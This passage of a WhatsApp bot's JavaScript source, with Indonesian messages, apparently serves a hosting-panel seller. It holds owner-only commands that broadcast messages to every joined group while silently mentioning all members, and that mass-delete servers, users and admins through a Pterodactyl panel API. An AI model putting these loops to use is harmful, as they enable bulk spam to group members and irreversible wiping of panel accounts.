  while (true) {
    let res = await fetch(`${domain}/api/application/users?page=${page}`, {
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + apikey
      }
    })

    if (!res.ok) break;

    let res2 = await res.json()
    let users = res2.data

    if (!users || users.length < 1) break

    for (let user of users) {
      if (user.attributes.id === idadmin && user.attributes.root_admin === true) {
        valid = true
        username = user.attributes.username
        break
      }
    }

    if (valid) break

    // Cek apakah ada halaman berikutnya
    if (!res2.meta || !res2.meta.pagination || !res2.meta.pagination.links || !res2.meta.pagination.links.next) break;

    page++
  }

  if (!valid) return m.reply("❌ ID admin panel tidak ditemukan atau bukan root admin.")

  let delusr = await fetch(`${domain}/api/application/users/${idadmin}`, {
    method: "DELETE",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: "Bearer " + apikey
    }
  })

  if (!delusr.ok) return m.reply("❌ Gagal menghapus admin panel!")

  m.reply(`✅ Berhasil menghapus akun admin panel *${capital(username)}* (ID: ${idadmin})`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "produk": case "listproduk": {
 await slideButton(m.chat, [m.sender])
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmslide": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await conn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await conn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmht": {
if (!isCreator) return Reply(mess.owner)

let teks = text ? text : (m.quoted && m.quoted.msg && m.quoted.msg.caption ? m.quoted.msg.caption : "")
if (!teks && !m.quoted) return m.reply(example("teksnya atau reply media"))

let allgrup = await conn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat

await m.reply(`Memproses *jpmht (hidetag)* ke ${res.length} grup...`)

for (let i of res) {
try {
let meta = await conn.groupMetadata(i)
let member = meta.participants.map(v => v.id)

// Jika ada media (foto / video / dokumen)
if (m.quoted && m.quoted.msg && m.quoted.msg.mimetype) {
    let mime = m.quoted.msg.mimetype
    let media = await m.quoted.download()

    await conn.sendMessage(i, {
        [mime.split('/')[0]]: media,
        mimetype: mime,
        caption: teks,
        mentions: member
    }, { quoted: m })

} else {
    // Jika hanya teks
    await conn.sendMessage(i, {
        text: teks,
        mentions: member
    }, { quoted: m })
}

count += 1
} catch {}
await sleep(global.delayJpm)
}

await conn.sendMessage(jid, {text: `*JpmHT Telah Selesai ✅*\nTotal grup berhasil: ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpm": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teksnya"))
let allgrup = await conn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await m.reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {text: `${teks}`}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpm2": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await conn.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* teks & foto Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {image: fs.readFileSync(rest), caption: teks}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sendtesti":
case "testi": {
 if (!isCreator) return Reply(global.mess.owner)
 if (!text) return m.reply(example("teks dengan mengirim foto"))
 if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))

 const allgrup = await conn.groupFetchAllParticipating()
 const res = await Object.keys(allgrup)
 let count = 0
 const teks = text
 const jid = m.chat
 const rest = await conn.downloadAndSaveMediaMessage(qmsg)

 await m.reply(`Memproses jpm testimoni ke dalam channel & ${res.length} grup...`)
 await conn.sendMessage(global.idSaluran, {
 image: await fs.readFileSync(rest),
 caption: teks
 })

 for (let i of res) {
 if (global.db.groups[i] && global.db.groups[i].blacklistjpm === true) continue
 try {
 await conn.sendMessage(i, {
 caption: `\n${teks}\n`,
 image: await fs.readFileSync(rest),
 footer: `© 2025 ${botname} 🚀`,
 buttons: [
 {
 buttonId: `.produk`,
 buttonText: { displayText: '🛍️ Lihat Produk' },
 type: 1
 },
 {
 buttonId: `.owner`,
 buttonText: { displayText: '👤 Owner' },
 type: 1
 }
 ],
 headerType: 4,
 viewOnce: true,
 contextInfo: {
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idSaluran,
 newsletterName: global.namaSaluran
 }
 }
 }, { quoted: qtoko })
 count += 1
 } catch (e) {
 console.log(`Gagal kirim ke ${i}`)
 }
 await sleep(global.delayJpm)
 }

 await fs.unlinkSync(rest)
 await conn.sendMessage(jid, {
 text: `✅ Testimoni berhasil dikirim ke dalam channel & ${count} grup.`
 }, { quoted: m })
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pay":
case "payment":
case "qris": {
  await conn.sendMessage(m.chat, {
    footer: `© 2025 ${botname}`,
    buttons: [
      { buttonId: '.dana', buttonText: { displayText: 'DANA' }, type: 1 },
      { buttonId: '.ovo', buttonText: { displayText: 'OVO' }, type: 1 },
      { buttonId: '.gopay', buttonText: { displayText: 'GOPAY' }, type: 1 }
    ],
    headerType: 4, // 4 = gambar header
    image: { url: global.image.qris }, 
    caption: "\n```Scan qris diatas dan jika sudah transfer mohon sertakan bukti```\n"
  }, { quoted: qtext2 });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "dana": {
  if (!isCreator) return;

  let teks = `
*PAYMENT DANA ${global.namaOwner.toUpperCase()}*

*Nomor:* ${global.dana}

📌 *Penting:* Wajib kirimkan bukti transfer demi keamanan bersama.
`.trim();

  // Generate pesan nativeFlowMessage dengan button salin
  let msg = await generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                name: "cta_copy",
                buttonType: 7,
                buttonParamsJson: JSON.stringify({
                  display_text: "📋 Salin Nomor Dana",
                  copy_code: global.dana
                })
              }
            ]
          })
        })
      }
    }
  }, { userJid: m.chat, quoted: qtext2 }); // quoted tetap pakai qtext2 kalau mau

  await conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ovo": {
  if (!isCreator) return;

  let teks = `
*PAYMENT OVO ${global.namaOwner.toUpperCase()}*

*Nomor:* ${global.ovo}

📌 *Penting:* Wajib kirimkan bukti transfer demi keamanan bersama.
`.trim();

  // Kirim pesan pakai nativeFlowMessage + button salin
  let msg = await generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                name: "cta_copy",
                buttonType: 7,
                buttonParamsJson: JSON.stringify({
                  display_text: "📋 Salin Nomor OVO",
                  copy_code: global.ovo
                })
              }
            ]
          })
        })
      }
    }
  }, { userJid: m.chat, quoted: qtext2 });

  await conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gopay": {
  if (!isCreator) return;

  let teks = `
*PAYMENT GOPAY ${global.namaOwner.toUpperCase()}*

*Nomor:* ${global.gopay}

📌 *Penting:* Wajib kirimkan bukti transfer demi keamanan bersama.
`.trim();

  // Kirim pesan pakai nativeFlowMessage + button salin
  let msg = await generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                name: "cta_copy",
                buttonType: 7,
                buttonParamsJson: JSON.stringify({
                  display_text: "📋 Salin Nomor Gopay",
                  copy_code: global.gopay
                })
              }
            ]
          })
        })
      }
    }
  }, { userJid: m.chat, quoted: qtext2 });

  await conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "proses": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await conn.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "done": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await conn.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Transaksi Done ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "developerbot":
case "dev":
case "owner": {
    try {

        let teks = `
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> *Halo Kak @${m.sender.split("@")[0]}, Tekan Tombol Untuk Menghubungi Owner atau Bot*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰`;

        // MEDIA
        const imgsc = await prepareWAMessageMedia(
            { image: { url: global.image.logo } },
            { upload: conn.waUploadToServer }
        );

        const carousel = proto.Message.InteractiveMessage.fromObject({
            body: { text: teks },
            contextInfo: { mentionedJid: [m.sender] },

            // ======================= CAROUSEL =======================
            carouselMessage: {
                cards: [
                    // ************* SLIDE 1 (OWNER) *************
                    {
                        header: {
                            title: `┏───────────────┈ 
┆     「 *[OWNER BOT]* 」
┣───────────────┈ 
┣──=[ *[ Al Luffy Official ]* ]==─
┆ • Jangan Chat Yang Aneh Aneh
┆ • Jangan Telpon/Call Owner 
┆ • Chat Langsung ke intinya aja
┆ • Klo Ada Uang Minimal Bagi
└────────────┈ ⳹`,
                            hasMediaAttachment: true,
                            ...imgsc
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "cta_url",
                                    buttonParamsJson: `{"display_text":"Buy Script","url":"${global.linkOwner}"}`
                                },
                                {
                                    name: "cta_url",
                                    buttonParamsJson: `{"display_text":"Telegram Admin","url":"${global.linkTelegram}"}`
                                },
                                {
                                    name: "cta_url",
                                    buttonParamsJson: `{"display_text":"Info Update Script","url":"${global.linkSaluran}"}`
                                }
                            ]
                        }
                    },

                    // ************* SLIDE 2 (BOT) *************
                    {
                        header: {
                            title: `┏───────────────┈ 
┆     「 *[NOMOR BOT]* 」
┣───────────────┈ 
┣──=[ *[ Bot Marceleven ]* ]==─
┆ • Jangan Spam Bot
┆ • Jangan Telpon/Call Bot 
┆ • Gausah Chat Yg Aneh Aneh
┆ • Beli Panel, Vps, Script, Dll Chat Owner
└────────────┈ ⳹`,
                            hasMediaAttachment: true,
                            ...imgsc
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "cta_url",
                                    buttonParamsJson: `{"display_text":"Bot Number","url":"${global.botNumber}"}`
                                },
                                {
                                    name: "cta_url",
                                    buttonParamsJson: `{"display_text":"Telegram Admin","url":"${global.linkTelegram}"}`
                                },
                                {
                                    name: "cta_url",
                                    buttonParamsJson: `{"display_text":"Info Update Script","url":"${global.linkSaluran}"}`
                                }
                            ]
                        }
                    }
                ]
            }
        });

        // SEND
        const msgii = await generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: carousel
                }
            }
        }, {});

        await conn.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id });

    } catch (e) {
        console.error(e);
        m.reply("❌ Gagal menampilkan info owner!");
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "save": case "sv": {
if (!isCreator) return
await conn.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "self": {
  if (!isCreator) return Reply("Khusus pemilik bot!");
  conn.public = false;
  fs.writeFileSync('./library/database/botmode.json', JSON.stringify({ public: false }, null, 2));
  m.reply("✅ Berhasil mengganti ke mode *self*");
}
break;

case "public": {
  if (!isCreator) return Reply("Khusus pemilik bot!");
  conn.public = true;
  fs.writeFileSync('./library/database/botmode.json', JSON.stringify({ public: true }, null, 2));
  m.reply("✅ Berhasil mengganti ke mode *public*");
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "getcase": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./ocho.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ping": case "uptime": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*🔴 INFORMATION SERVER*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}

*🔵 INFORMATION BOTZ*

*• Respon Speed :* ${latensi.toFixed(4)} detik
*• Runtime Bot :* ${runtime(process.uptime())}
`
await m.reply(respon)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "restart":
case "rst": {
    if (!isCreator) return Reply(mess.owner)

    await m.reply("🔄 *Memproses restart server...*")

    try {
        // Hapus semua file di session kecuali creds.json
        const file = fs.readdirSync("./session")
        const anu = file.filter(i => i !== "creds.json")
        
        for (let t of anu) {
            try {
                fs.unlinkSync(`./session/${t}`)
            } catch (e) {
                // Skip jika gagal menghapus
            }
        }

        // Restart dengan cara yang lebih aman
        let filePath = require.resolve(__filename)
        
        // Hapus cache untuk memaksa reload
        Object.keys(require.cache).forEach(key => {
            delete require.cache[key]
        })
        
        // Kirim pesan sebelum restart
        await m.reply("✅ *Restart berhasil! Bot akan dimulai ulang...*")
        
        // Tunggu sebentar sebelum reload
        await sleep(2000)
        
        // Reload semua module
        console.log(chalk.yellow.bold("\n⚠️  Bot sedang direstart..."))
        
        // Simpan instance Sky yang aktif (jika diperlukan untuk cleanup)
        if (global.Sky && global.Sky.ws && global.Sky.ws.close) {
            try {
                global.Sky.ws.close()
                global.Sky.ev.removeAllListeners()
            } catch (e) {
                // Ignore error
            }
        }
        
        // Hapus semua global listeners
        process.removeAllListeners()
        
        // Restart bot dengan spawn baru
        if (process.send) {
            process.send('reset')
        } else {
            // Fallback: restart dengan child process
            const { spawn } = require('child_process')
            const child = spawn(process.argv[0], process.argv.slice(1), {
                stdio: 'inherit',
                detached: true
            })
            child.unref()
            process.exit(0)
        }
        
    } catch (err) {
        console.error("[ERROR] Gagal merestart:", err)
        return m.reply("❌ *Gagal merestart server:* " + err.message)
    }
    break
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *乂 List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
conn.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delowner": case "delown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addcase": {
    if (!isCreator) return Reply(mess.owner);
    if (!text) return Reply(`Contoh: ${prefix + command} *casenya*`);
    const namaFile = path.join(__dirname, 'ocho.js');
    const caseBaru = `${text}\n\n`;
    const tambahCase = (data, caseBaru) => {
        const posisiDefault = data.lastIndexOf("default:");
        if (posisiDefault !== -1) {
            const kodeBaruLengkap = data.slice(0, posisiDefault) + caseBaru + data.slice(posisiDefault);
            return { success: true, kodeBaruLengkap };
        } else {
            return { success: false, message: "Tidak dapat menemukan case default di dalam file!" };
        }
    };
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return Reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
        }
        const result = tambahCase(data, caseBaru);
        if (result.success) {
            fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
                if (err) {
                    console.error('Terjadi kesalahan saat menulis file:', err);
                    return Reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
                } else {
                    console.log('Sukses menambahkan case baru:');
                    console.log(caseBaru);
                    return Reply('Sukses menambahkan case!');
                }
            });
        } else {
            console.error(result.message);
            return Reply(result.message);
        }
    });
}
break

case "delcase": {
 if (!isCreator) return onlyOwn();
 if (!text) 
 return Reply(`Contoh: .delcase *nama_case*`);

 const fs = require('fs').promises;

 async function removeCase(filePath, caseNameToRemove) {
   try {
     let data = await fs.readFile(filePath, 'utf8');
     
     // Regex untuk mencari dan menghapus blok kode case menggunakan tanda kutip ganda
     const regex = new RegExp(`case\\s+"${caseNameToRemove}":[\\s\\S]*?break`, 'g');

     if (!regex.test(data)) {
       return Reply(`Case "${caseNameToRemove}" tidak ditemukan.`);
     }

     let newData = data.replace(regex, '');
     await fs.writeFile(filePath, newData, 'utf8');
     return Reply(`Berhasil menghapus case "${caseNameToRemove}".`);
   } catch (err) {
     console.error(err);
     return Reply('Terjadi kesalahan saat menghapus case.');
   }
 }

 // Jalankan fungsi hapus case
 let filePath = './ocho.js'; // Ganti dengan path file sebenarnya
 removeCase(filePath, text.trim());
 break;
}

case "editcase": {
    if (!isCreator) return m.reply(mess.owner);
    if (!text.includes("|")) return m.reply(`Contoh: cmd jpmch|jpmalluffy`);
    
    const [caseLama, caseBaru] = text.split("|").map(a => a.trim());
    if (!caseLama || !caseBaru) return m.reply(`Format salah!\nContoh: cmd jpmch|jpmalluffy`);

    const namaFile = path.join(__dirname, 'ocho.js');

    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return m.reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
        }

        // regex buat nyari case
        const regex = new RegExp(`case\\s+"${caseLama}"\\s*:`, "g");

        if (!regex.test(data)) {
            return m.reply(`Case "${caseLama}" tidak ditemukan di dalam file!`);
        }

        // replace dengan case baru
        const kodeBaruLengkap = data.replace(regex, `case "${caseBaru}":`);

        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                console.error('Terjadi kesalahan saat menulis file:', err);
                return m.reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
            } else {
                console.log(`Sukses mengubah case ${caseLama} menjadi ${caseBaru}`);
                return m.reply(`✅ Sukses! Case \`${caseLama}\` sudah diubah ke \`${caseBaru}\``);
            }
        });
    });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delallserver": {
  if (!isCreator) return Reply(mess.owner);

  try {
    let listDeleted = [];

    // ===== Ambil SEMUA server dari semua halaman =====
    let servers = [];
    let page = 1;
    while (true) {
      let res = await fetch(`${domain}/api/application/servers?page=${page}`, {
        method: "GET",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${apikey}`
        }
      });
      let data = await res.json();
      if (!data.data || data.data.length === 0) break;
      servers.push(...data.data);
      page++;
    }

    if (servers.length < 1) return m.reply("Tidak ada server untuk dihapus!");

    // ===== Ambil SEMUA user dari semua halaman =====
    let users = [];
    let userPage = 1;
    while (true) {
      let resUser = await fetch(`${domain}/api/application/users?page=${userPage}`, {
        method: "GET",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${apikey}`
        }
      });
      let userData = await resUser.json();
      if (!userData.data || userData.data.length === 0) break;
      users.push(...userData.data);
      userPage++;
    }

    // ===== Hapus semua server dan user terkait =====
    for (let server of servers) {
      let s = server.attributes;
      let name = s.name.toLowerCase();

      // Hapus server
      await fetch(`${domain}/api/application/servers/${s.id}`, {
        method: "DELETE",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${apikey}`
        }
      });

      // Cari user yang nama depannya = nama server, lalu hapus
      let targetUser = users.find(u => u.attributes.first_name.toLowerCase() === name);
      if (targetUser) {
        await fetch(`${domain}/api/application/users/${targetUser.attributes.id}`, {
          method: "DELETE",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: `Bearer ${apikey}`
          }
        });
      }

      listDeleted.push(`• ${s.name} (ID: ${s.id})`);
    }

    if (listDeleted.length < 1) return m.reply("Tidak ada server yang berhasil dihapus.")
    m.reply(`✅ Berhasil menghapus semua server:\n\n${listDeleted.join("\n")}`);

  } catch (e) {
    console.error(e);
    m.reply("❌ Gagal menghapus semua server. Cek log untuk detail.");
  }
}
break;

case "delallserver-v2": {
  if (!isCreator) return Reply(mess.owner);

  try {
    let listDeleted = [];

    // ===== Ambil SEMUA server dari semua halaman =====
    let servers = [];
    let page = 1;
    while (true) {
      let res = await fetch(`${domainV2}/api/application/servers?page=${page}`, {
        method: "GET",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${apikeyV2}`
        }
      });
      let data = await res.json();
      if (!data.data || data.data.length === 0) break;
      servers.push(...data.data);
      page++;
    }

    if (servers.length < 1) return m.reply("Tidak ada server untuk dihapus!");

    // ===== Ambil SEMUA user dari semua halaman =====
    let users = [];
    let userPage = 1;
    while (true) {
      let resUser = await fetch(`${domainV2}/api/application/users?page=${userPage}`, {
        method: "GET",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${apikeyV2}`
        }
      });
      let userData = await resUser.json();
      if (!userData.data || userData.data.length === 0) break;
      users.push(...userData.data);
      userPage++;
    }

    // ===== Hapus semua server dan user terkait =====
    for (let server of servers) {
      let s = server.attributes;
      let name = s.name.toLowerCase();

      // Hapus server
      await fetch(`${domainV2}/api/application/servers/${s.id}`, {
        method: "DELETE",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${apikeyV2}`
        }
      });

      // Cari user yang nama depannya = nama server, lalu hapus
      let targetUser = users.find(u => u.attributes.first_name.toLowerCase() === name);
      if (targetUser) {
        await fetch(`${domainV2}/api/application/users/${targetUser.attributes.id}`, {
          method: "DELETE",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: `Bearer ${apikeyV2}`
          }
        });
      }

      listDeleted.push(`• ${s.name} (ID: ${s.id})`);
    }

    if (listDeleted.length < 1) return m.reply("Tidak ada server yang berhasil dihapus.")
    m.reply(`✅ Berhasil menghapus semua server:\n\n${listDeleted.join("\n")}`);

  } catch (e) {
    console.error(e);
    m.reply("❌ Gagal menghapus semua server. Cek log untuk detail.");
  }
}
break;

case "delalluser": {
  if (!isCreator) return Reply(mess.owner);

  try {
    let users = [];
    let deleted = [];
    let page = 1;

    // Loop ambil semua user dari semua halaman
    while (true) {
      let res = await fetch(`${domain}/api/application/users?page=${page}`, {
        method: "GET",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${apikey}`
        }
      });

      let data = await res.json();
      if (!data.data || data.data.length === 0) break;

      users.push(...data.data);
      page++;
    }

    if (users.length < 1) return m.reply("Tidak ada user yang ditemukan.");

    // Hapus semua user yang bukan admin
    for (let user of users) {
      let u = user.attributes;
      if (u.root_admin === false) {
        await fetch(`${domain}/api/application/users/${u.id}`, {
          method: "DELETE",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: `Bearer ${apikey}`
          }
        });

        deleted.push(`• ${u.username} (ID: ${u.id})`);
      }
    }

    if (deleted.length < 1) return m.reply("Tidak ada user biasa yang dihapus.");
    m.reply(`✅ Berhasil menghapus semua user biasa:\n\n${deleted.join("\n")}`);

  } catch (e) {
    console.error(e);
    m.reply("❌ Gagal menghapus user. Cek log untuk detail.");
  }
}
break;

case "delalluser-v2": {
  if (!isCreator) return Reply(mess.owner);

  try {
    let users = [];
    let deleted = [];
    let page = 1;

    // Loop ambil semua user dari semua halaman
    while (true) {
      let res = await fetch(`${domainV2}/api/application/users?page=${page}`, {
        method: "GET",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${apikeyV2}`
        }
      });

      let data = await res.json();
      if (!data.data || data.data.length === 0) break;

      users.push(...data.data);
      page++;
    }

    if (users.length < 1) return m.reply("Tidak ada user yang ditemukan.");

    // Hapus semua user yang bukan admin
    for (let user of users) {
      let u = user.attributes;
      if (u.root_admin === false) {
        await fetch(`${domainV2}/api/application/users/${u.id}`, {
          method: "DELETE",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: `Bearer ${apikeyV2}`
          }
        });

        deleted.push(`• ${u.username} (ID: ${u.id})`);
      }
    }

    if (deleted.length < 1) return m.reply("Tidak ada user biasa yang dihapus.");
    m.reply(`✅ Berhasil menghapus semua user biasa:\n\n${deleted.join("\n")}`);

  } catch (e) {
    console.error(e);
    m.reply("❌ Gagal menghapus user. Cek log untuk detail.");
  }
}
break;

case "addreseller": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
pler.push(m.chat)
fs.writeFileSync('./library/database/idgrup.json', JSON.stringify(pler))
Reply(`*Sukses Memberi Akses Ke Group Ini✅*`)
}
break

case "addreseller-v2": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
pler2.push(m.chat)
fs.writeFileSync('./library/database/idgrup2.json', JSON.stringify(pler2))
Reply(`*Sukses Memberi Akses Ke Group Ini✅*`)
}
break

case "delreseller": {
